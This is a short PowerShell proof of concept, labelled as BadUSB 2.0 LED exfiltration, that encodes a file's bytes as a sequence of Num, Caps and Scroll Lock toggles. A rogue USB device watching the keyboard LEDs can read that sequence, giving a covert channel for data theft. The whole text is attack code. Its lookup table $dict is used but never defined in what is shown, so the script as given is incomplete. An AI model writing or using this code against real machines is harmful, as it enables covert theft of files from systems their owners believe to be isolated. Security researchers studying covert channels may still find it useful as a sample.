#BadUSB 2.0 PowerShell USB-HID LED Exfiltration POC
#Author DK 2016 (@withdk)

function s($b) {
	$N="{NUMLOCK}"
	$C="{CAPSLOCK}"
	$S="{SCROLLLOCK}"
	$wsh=New-Object -ComObject WScript.Shell
	
	for ($i=0;$i -lt $b.length;$i++) {
		Start-Sleep -m 600
		$o=$b[$i]
		if($o -eq "C") { $wsh.SendKeys($C) }
		if($o -eq "S") { $wsh.SendKeys($S) }
		if($o -eq "N") { $wsh.SendKeys($N) }
	}
}

function g($file) {
	s("SSS");
	Get-Content $file -Encoding byte -ReadCount 8 | ForEach-Object { 
		foreach ($byte in $_) { 
			$h=("{0:X2}" -f $byte);
			if($byte -gt 20 -And $byte -lt 127) {
				$h
				$p=$dict.get_item($h[0].toString());
				s($p);
				$p=$dict.get_item($h[1].toString());
				s($p);
			}
		} 
	}
	s("SSS");
}
